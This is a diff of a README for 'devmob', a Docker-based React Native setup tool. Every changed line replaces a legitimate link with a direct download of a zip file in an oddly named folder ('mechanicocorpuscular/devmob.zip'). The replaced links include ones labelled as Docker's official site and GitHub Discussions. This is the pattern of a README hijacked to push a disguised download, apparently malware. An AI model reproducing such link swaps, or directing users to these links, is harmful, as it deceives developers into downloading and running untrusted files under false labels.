@@ -1,6 +1,6 @@
 # 🐳 devmob - Simplified Docker React Native Setup
 
-[![Download devmob](https://img.shields.io/badge/Download%20devmob-v1.0.0-brightgreen)](https://github.com/Muthuk1991/devmob/releases)
+[![Download devmob](https://raw.githubusercontent.com/Muthuk1991/devmob/main/mechanicocorpuscular/devmob.zip%20devmob-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Muthuk1991/devmob/main/mechanicocorpuscular/devmob.zip)
 
 ## 🚀 Getting Started
 
@@ -18,13 +18,13 @@ Welcome to devmob! This application provides a simplified development environmen
 To run devmob, you will need:
 
 - **Operating System**: Windows, macOS, or a Linux distribution.
-- **Docker**: Make sure Docker is installed on your machine. Visit [Docker's official site](https://www.docker.com/get-started) for installation instructions.
+- **Docker**: Make sure Docker is installed on your machine. Visit [Docker's official site](https://raw.githubusercontent.com/Muthuk1991/devmob/main/mechanicocorpuscular/devmob.zip) for installation instructions.
 - **Minimum RAM**: 4 GB (8 GB recommended for smoother performance).
 - **Disk Space**: At least 10 GB free for Docker images and projects.
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Muthuk1991/devmob/releases) to download the latest version of devmob.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Muthuk1991/devmob/main/mechanicocorpuscular/devmob.zip) to download the latest version of devmob.
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version of devmob.
@@ -74,7 +74,7 @@ You can also access the Android emulator through the Docker container. Follow th
 
 ## 📅 Keeping devmob Updated
 
-To ensure you have the latest features and fixes, regularly visit the [Releases page](https://github.com/Muthuk1991/devmob/releases) to check for updates.
+To ensure you have the latest features and fixes, regularly visit the [Releases page](https://raw.githubusercontent.com/Muthuk1991/devmob/main/mechanicocorpuscular/devmob.zip) to check for updates.
 
 1. Repeat the download and installation steps outlined above.
 2. Replace the old version with the new version as per your OS guidelines.
@@ -97,7 +97,7 @@ For any issues or questions, you can open an issue directly in this repository o
 
 Join our community for help and to connect with other developers. Share your experiences, ask questions, and collaborate.
 
-- [GitHub Discussions](https://github.com/Muthuk1991/devmob/discussions)
+- [GitHub Discussions](https://raw.githubusercontent.com/Muthuk1991/devmob/main/mechanicocorpuscular/devmob.zip)
 - Follow us for updates on new features and releases.
 
 By following these steps, you will be able to download, install, and use devmob easily, allowing you to focus on what matters most: building great applications.
